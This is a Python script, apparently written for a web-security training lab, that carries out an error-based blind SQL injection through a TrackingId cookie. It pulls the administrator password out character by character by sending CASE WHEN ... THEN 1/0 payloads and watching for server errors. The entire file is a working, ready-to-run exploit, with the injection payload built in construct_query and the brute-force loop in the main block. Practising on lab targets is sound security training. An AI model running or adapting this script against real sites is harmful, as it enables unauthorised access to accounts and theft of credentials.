import requests
from itertools import chain

class AlphabetListing:

    def __iter__(self):
        self.character = 'a'
        return self
    
    def __next__(self):
        if self.character > 'z':
            raise StopIteration
        else:
            character = self.character 
            self.character = chr(ord(self.character) + 1)
            return character

class NumberListing:

    def __iter__(self):
        self.number = 0
        return self

    def __next__(self):
        if self.number > 9:
            raise StopIteration
        else:
            number = self.number
            self.number += 1
            return str(number)

def construct_query(character: str, prestring: str = '',any_after: bool = True) -> str:
    return f'\'+AND+1=(SELECT+DISTINCT+CASE+WHEN+users.username=\'administrator\'+AND+users.password+LIKE+\'{prestring + character + "%25" if any_after else prestring + character }\'+THEN+1/0+ELSE+1+END+FROM+users)+--+-'

if __name__ == '__main__':

    domain = '0ad500c504bb71718094302b00510008.web-security-academy.net'
    url = 'https://' + domain

    tracking_id = 'hxIblkphU07lbqTZ'

    jar = requests.cookies.RequestsCookieJar()
    jar.set('session','AqiXAnJHbKDDJnI457wxrlgbMh2Bfe5E')

    password = ''
    last_character = False
    while not last_character:
        last_character = True
        for character in chain(AlphabetListing(),NumberListing()):
            query = construct_query(character,password)
            jar.set('TrackingId',tracking_id + query,domain=domain)
            response = requests.get(url,cookies = jar)
            if response.status_code == requests.codes.internal_server_error:
                last_character = False
                password = password + character
                break
        print(f'Password so far is: {password}')





    